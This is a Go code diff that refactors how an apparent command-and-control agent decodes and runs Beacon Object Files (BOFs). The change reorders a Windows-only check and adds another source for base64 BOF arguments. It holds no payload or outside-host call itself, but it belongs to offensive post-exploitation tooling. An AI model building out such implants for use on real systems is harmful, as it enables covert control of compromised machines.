@@ -156,16 +156,6 @@ func (c *JobStopMsg) execute(ctx *OpCtx, args []string) OpResult {
 
 // processBOFAsync handles async BOF execution (called from WorkQueue)
 func (cq *WorkQueue) processBOFAsync(cmd Msg) OpResult {
-	osWindows := bofOSWindows()
-	if runtime.GOOS != osWindows {
-		return OpResult{
-			Cmd:     cmd,
-			Output:      Err(E25),
-			EC:    1,
-			Done: time.Now().Format(time.RFC3339),
-		}
-	}
-
 	var bofData string
 	var bofArgsFromJSON string
 	var bofWrapper struct {
@@ -194,6 +184,16 @@ func (cq *WorkQueue) processBOFAsync(cmd Msg) OpResult {
 		bofData = cmd.Data
 	}
 
+	osWindows := bofOSWindows()
+	if runtime.GOOS != osWindows {
+		return OpResult{
+			Cmd:     cmd,
+			Output:      Err(E25),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
+		}
+	}
+
 	bofBytes, err := base64.StdEncoding.DecodeString(bofData)
 	if err != nil {
 		return OpResult{
@@ -206,20 +206,25 @@ func (cq *WorkQueue) processBOFAsync(cmd Msg) OpResult {
 	}
 
 	var bofArgs []byte
-	if bofArgsFromJSON != "" {
-		decoded, err := base64.StdEncoding.DecodeString(bofArgsFromJSON)
-		if err == nil {
+	if cmd.Arguments != "" {
+		if decoded, decErr := base64.StdEncoding.DecodeString(cmd.Arguments); decErr == nil {
 			bofArgs = decoded
 		}
 	}
-	asyncPrefix := bofAsyncCmdPrefix()
-	if bofArgs == nil && cmd.Cmd != "" && strings.HasPrefix(cmd.Cmd, asyncPrefix) {
-		argString := strings.TrimPrefix(cmd.Cmd, asyncPrefix)
-		if argString != "" {
-			parsedArgs, err := parseBOFArguments(argString)
-			if err != nil {
-			} else {
-				bofArgs = parsedArgs
+	if bofArgs == nil && bofArgsFromJSON != "" {
+		if decoded, decErr := base64.StdEncoding.DecodeString(bofArgsFromJSON); decErr == nil {
+			bofArgs = decoded
+		}
+	}
+	if bofArgs == nil {
+		asyncPrefix := bofAsyncCmdPrefix()
+		if cmd.Cmd != "" && strings.HasPrefix(cmd.Cmd, asyncPrefix) {
+			argString := strings.TrimPrefix(cmd.Cmd, asyncPrefix)
+			if argString != "" {
+				parsedArgs, err := parseBOFArguments(argString)
+				if err == nil {
+					bofArgs = parsedArgs
+				}
 			}
 		}
 	}
